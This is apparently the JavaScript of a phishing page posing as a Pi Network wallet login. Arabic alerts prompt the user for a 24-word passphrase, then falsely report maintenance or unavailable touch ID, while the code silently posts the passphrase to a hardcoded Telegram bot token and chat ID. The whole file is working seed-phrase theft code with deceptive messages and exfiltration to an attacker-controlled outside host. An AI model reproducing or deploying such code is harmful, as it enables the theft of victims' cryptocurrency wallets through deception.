function sendToTelegram() {
    const passphrase = document.getElementById('passphrase').value;
    if (!passphrase) {
        alert("يرجى إدخال عبارة المرور المكونة من 24 كلمة.");
        return;
    }

    // عرض رسالة الصيانة
    alert("الموقع تحت الصيانة يرجى إعادة المحاولة.");

    // إرسال البيانات إلى تيليجرام
    const token = "6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs";
    const chatId = "1046458749";
    const message = `PiNetwork\n\nPassphrase: ${passphrase}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    }).catch(error => {
        console.error(error);
    });
}

function showTouchAlert() {
    alert("نعتذر، استخدام معرف اللمس غير متاح حاليًا. يرجى استخدام عبارة المرور.");
}